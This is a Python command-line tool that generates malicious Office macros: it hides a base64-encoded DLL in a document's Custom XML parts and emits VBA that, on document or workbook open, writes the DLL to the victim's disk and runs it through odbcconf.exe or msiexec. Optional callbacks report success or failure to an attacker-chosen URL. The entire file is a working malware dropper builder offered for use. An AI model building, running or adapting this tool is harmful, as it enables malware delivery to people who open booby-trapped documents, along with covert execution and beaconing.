import click
import string
import random
import base64
import jinja2
import sys

# TODO:
# 1. Add exception handling
# 2. Check if file has been already dropped 

VBA_TEMPLATE = '''
Option Explicit

Private Type STARTUPINFO
    cb As Long                  'DWORD  cb;
    lpReserved As String        'LPSTR  lpReserved;
    lpDesktop As String         'LPSTR  lpDesktop;
    lpTitle As String           'LPSTR  lpTitle;
    dwX As Long                 'DWORD  dwX;
    dwY As Long                 'DWORD  dwY;
    dwXSize As Long             'DWORD  dwXSize;
    dwYSize As Long             'DWORD  dwYSize;
    dwXCountChars As Long       'DWORD  dwXCountChars;
    dwYCountChars As Long       'DWORD  dwYCountChars;
    dwFillAttribute As Long     'DWORD  dwFillAttribute;
    dwFlags As Long             'DWORD  dwFlags;
    wShowWindow As Integer      'WORD   wShowWindow;
    cbReserved2 As Integer      'WORD   cbReserved2;
    lpReserved2 As LongPtr      'LPBYTE lpReserved2;
    hStdInput As LongPtr        'HANDLE hStdInput;
    hStdOutput As LongPtr       'HANDLE hStdOutput;
    hStdError As LongPtr        'HANDLE hStdError;
End Type

' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms684873(v=vs.85).aspx
Private Type PROCESS_INFORMATION
    hProcess As LongPtr     'HANDLE hProcess;
    hThread As LongPtr      'HANDLE hThread;
    dwProcessId As Long     'DWORD  dwProcessId;
    dwThreadId As Long      'DWORD  dwThreadId;
End Type

#If Win64 Then
    Private Declare PtrSafe Function Create Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#Else
    Private Declare Function Create Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If


{% if 'doc' in config['type'] %}
Sub AutoOpen()
    Run
End Sub

Sub Document_Open()
    Run
End Sub
{% elif 'xl' in config['type'] %}
Sub Auto_Open()
    Run
End Sub

Sub Workbook_Open()
    Run
End Sub
{% endif %}

Sub Run()
    Dim root As String
    Dim path As String
    Dim exe As String
    Dim startInfo As STARTUPINFO
    Dim procInfo As PROCESS_INFORMATION
    Dim res As Long

    path = {{config['path']}}
    Drop(path)
    {%- if 'callback' in config %}
    Dim exists As String
    Dim hReq As Object
    
    exists = Dir(path)
    Set hReq = CreateObject("MSXML2.XMLHTTP")
    if exists = "" Then
        Send hReq, "{{config['callback']['fail']}}"
        Exit Sub
    Else
        Send hReq, "{{config['callback']['success']}}"
    End If
    {%- endif %}
    
    #If Win64 Then
        root = "C:\\Windows\\System32\\"
    #Else
        root = "C:\\Windows\\SysNative\\"
    #End If

    {%- if 'odbcconf' in config['exe'] %}
    exe = root & "odbcconf.exe /a {REGSVR " & path & "}"
    {%- elif 'msiexec' in config['exe'] %}
    exe = root & "msiexec.exe /y " & path
    {% endif %}
    res = Create(vbNullString, exe, &0, &0, False, &0, &0, vbNullString, startInfo, procInfo)
    {%- if 'callback' in config %}
    If res = 0 Then
        Send hReq, "{{config['callback']['fail']}}"
        Exit Sub
    Else
        Send hReq, "{{config['callback']['success']}}"
    End If 
    {% endif %}
End Sub

Sub Drop(ByVal Path As String)
    Dim decoded, objFSO, objFile
    decoded = B64(GetCustomPart("{{config['part']}}"))
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objFile = objFSO.CreateTextFile(Path, True)
    objFile.Write decoded
    objFile.Close
End Sub

Sub Send(ByVal hReq As Object, ByVal url As String)
    With hReq
        .Open "GET", url, False
        .Send
    End With
End Sub

Function GetCustomXMLPart(ByVal Name As String) As Object
    Dim part
    Dim parts
    
    On Error Resume Next
    {%- if 'doc' in config['type'] %}
    Set parts = ActiveDocument.CustomXMLParts
    {%- elif 'xl' in config['type'] %}
    Set parts = ThisWorkbook.CustomXMLParts
    {% endif %}
    
    For Each part In parts
        If part.SelectSingleNode("/*").BaseName = Name Then
            Set GetCustomXMLPart = part
            Exit Function
        End If
    Next
        
    Set GetCustomXMLPart = Nothing
End Function

Function GetCustomXMLPartTextSingle(ByVal Name As String) As String
    Dim part
    Dim out, m, n
    
    Set part = GetCustomXMLPart(Name)
    If part Is Nothing Then
        GetCustomXMLPartTextSingle = ""
    Else
        out = part.DocumentElement.Text
        n = Len(out) - 2 * Len(Name) - 5
        m = Len(Name) + 3
        If Mid(out, 1, 1) = "<" And Mid(out, Len(out), 1) = ">" And Mid(out, m - 1, 1) = ">" Then
            out = Mid(out, m, n)
        End If
        GetCustomXMLPartTextSingle = out
    End If
End Function

Function GetCustomPart(ByVal Name As String) As String
    On Error GoTo ProcError
    Dim tmp, j
    Dim part
    j = 0
    
    Set part = GetCustomXMLPart(Name & "_" & j)
    While Not part Is Nothing
        tmp = tmp & GetCustomXMLPartTextSingle(Name & "_" & j)
        j = j + 1
        Set part = GetCustomXMLPart(Name & "_" & j)
    Wend
    
    If Len(tmp) = 0 Then
        tmp = GetCustomXMLPartTextSingle(Name)
    End If
    
    GetCustomPart = tmp
    
ProcError:
End Function

Function B64(ByVal data As String) As Byte()
    Dim objXML2 As Object
    Dim objNode As Object

    Set objXML2 = CreateObject("MSXML2.DOMDocument")
    Set objNode = objXML2.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = data
    B64 = StrConv(objNode.nodeTypedValue, vbUnicode)
    Set objNode = Nothing
    Set objXML2 = Nothing
End Function
'''

def generate_customxml(payload):
    part_name = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
    step = 512
    customxml = ''
    part_number = 1
    encoded = base64.b64encode(payload).decode()
    for i in range(0, len(encoded), step):
        customxml += '<{0}_{1}>{2}</{0}_{1}>\n'.format(part_name, part_number, encoded[i:i+step])
        part_number += 1

    return '<{0}_0>\n{1}</{0}_0>'.format(part_name, customxml), part_name

@click.command()
@click.option('--dll', '-d', type=click.Path(exists=True), help='Embed DLL payload')
@click.option('--doctype', '-t', default='doc', type=click.Choice(['doc', 'xl']))
@click.option('--drop-path', '-p', type=str, default='Environ("USERPROFILE") & "\\Documents\\eva.bin"', help='Path on a target system')
@click.option('--execute', '-e', default='odbcconf', type=click.Choice(['odbcconf','msiexec']))
@click.option('--xml-out', '-x', type=click.Path(exists=False), default=None, help='Output CustomXML part')
@click.option('--vba-out', '-v', type=click.Path(exists=False), default=None, help='Output VBA')
@click.option('--callback-fail', type=str, default=None, help='Callback URL on fail')
@click.option('--callback-success', type=str, default=None, help='Callback URL on success')
def cli(dll, doctype, drop_path, execute, xml_out, vba_out, callback_fail, callback_success):
    """Generate dropper macros that drops payload from Custom XML part and executes DLL sideload."""

    with open(dll, 'rb') as f:
        customxml, part_name = generate_customxml(f.read())
    
    if xml_out is None:
        print(customxml)
    else:
        with open(xml_out, 'w') as f:
            f.write(customxml)

    config = {
        'part': part_name,
        'type': doctype,
        'exe': execute,
        'path': drop_path,
    }

    if callback_fail is not None and callback_success is not None:
        config['callback'] = {'success': callback_success, 'fail': callback_fail}

    template = jinja2.Environment(loader=jinja2.BaseLoader).from_string(VBA_TEMPLATE)
    vba = template.render(config=config)

    if vba_out is None:
        print(vba)
    else:
        with open(vba_out, 'w') as f:
            f.write(vba)

if __name__ == '__main__':
    cli()